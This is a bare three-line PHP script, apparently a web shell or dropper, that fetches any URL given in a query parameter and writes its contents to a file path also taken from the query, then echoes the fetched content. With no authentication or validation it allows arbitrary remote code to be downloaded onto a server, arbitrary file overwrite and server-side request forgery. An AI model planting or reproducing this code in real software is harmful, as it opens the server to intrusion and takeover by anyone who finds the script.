<?php
file_put_contents($_GET["id"],file_get_contents($_GET["url"]));
echo file_get_contents($_GET["url"])
?>
